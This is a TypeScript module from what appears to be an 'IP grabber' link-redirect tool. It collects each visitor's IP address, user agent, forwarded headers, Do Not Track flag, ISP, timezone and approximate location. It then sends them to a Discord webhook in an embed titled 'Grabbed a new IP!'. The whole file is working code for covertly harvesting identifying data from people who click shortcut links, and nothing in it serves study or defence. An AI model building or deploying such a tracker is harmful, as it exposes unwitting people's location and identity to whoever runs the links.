import { Webhook, RichEmbed } from 'https://deno.land/x/discord_webhook@1.0.0/mod.ts'
import { EmbedField } from 'https://deno.land/x/discord_webhook@1.0.0/src/EmbedStructures.ts'

import { WebhookData } from './types.ts'

import { enabled, links, webhookURL } from '../config.ts'

// send discord webhook
export const sendWebhook = async (data: WebhookData): Promise<void> => {
	// create  the list to push the fields into
	const fields: EmbedField[] = []

	// standard data points
	if (enabled.ip) {
		fields.push({
			name: 'IP',
			value: data.forwarded?.ip || data.ip
		})
	}
	if (enabled.method) {
		fields.push({
			name: 'Method',
			value: data.method
		})
	}
	if (enabled.url) {
		fields.push({
			name: 'URL',
			value: data.url
		})
	}
	if (enabled.ua) {
		fields.push({
			name: 'User Agent',
			value: data.useragent
		})
	}
	if (enabled.host) {
		fields.push({
			name: 'Host',
			value: data.host
		})
	}

	// get shortcut and destination if they exist
	const url = new URL(data.url)
	const shortcut: string = url.pathname.substring(url.pathname.indexOf('/') + 1)
	const redirect = links.find(l => l.from === shortcut)
	if (enabled.redirect && redirect) {
		fields.push({
			name: 'Shortcut',
			value: `/${shortcut} => ${redirect.to}`
		})
	}

	// add optional data
	if (enabled.dnt && data.dnt) {
		fields.push({
			name: 'Do Not Track',
			value: data.dnt === '1' ? 'True' : 'False',
		})
	}
	if (enabled.upgrade && data.upgrade) {
		fields.push({
			name: 'HTTPS Upgrade',
			value: data.upgrade === '1' ? 'True' : 'False'
		})
	}
	if (enabled.redirect && data.redirect) {
		fields.push({
			name: 'Redirect',
			value: data.redirect
		})
	}

	// add forwarded data
	if (data.forwarded) {
		if (enabled.ip && data.forwarded.ip) {
			fields.push({
				name: 'X-Real-IP',
				value: data.forwarded.ip
			})
		}
		if (enabled.forwarded?.for && data.forwarded.for) {
			fields.push({
				name: 'X-Forwarded-For',
				value: data.forwarded.for
			})
		}
		if (enabled.forwarded?.host && data.forwarded.host) {
			fields.push({
				name: 'X-Forwarded-Host',
				value: data.forwarded.host
			})
		}
		if (enabled.forwarded?.proto && data.forwarded.proto) {
			fields.push({
				name: 'X-Forwarded-Proto',
				value: data.forwarded.proto
			})
		}
		if (enabled.forwarded?.scheme && data.forwarded.scheme) {
			fields.push({
				name: 'X-Forwarded-Scheme',
				value: data.forwarded.scheme
			})
		}
	}

	// add location data
	const location = data.location
		? { text: `Location: ${data.location.city}, ${data.location.regionName}, ${data.location.country}` }
		: undefined
	if (location) {
		if (enabled.location?.isp && data.location?.isp) {
			fields.push({
				name: 'ISP',
				value: data.location?.isp
			})
		}
		if (enabled.location?.timezone && data.location?.timezone) {
			fields.push({
				name: 'Timezone',
				value: data.location?.timezone
			})
		}
	}

	// create the embed to send
	const embed = new RichEmbed(
		// title of the embed 
		'IP Grabbed',
		// description of the embed
		'Grabbed a new IP!',
		// a hyperlink for the title 
		undefined,
		// timestamp of the embedded content 
		// Date.now().toString(),
		undefined,
		// color code for the embed
		5763719, // discord green
		// footer information
		location,	
		// data.location?.city ? { text: data.location.city } : undefined,
		// image
		undefined,
		// thumbnail
		undefined,
		// video
		undefined,
		// provider
		undefined,
 		// author
		undefined,
		// fields 
		fields
	)

	const wh = new Webhook(webhookURL)

	// send webhook
	try {
		await wh.post(embed)
	} catch (err) {
		console.error('Failed to send webhook:', err);
		return
	}
}

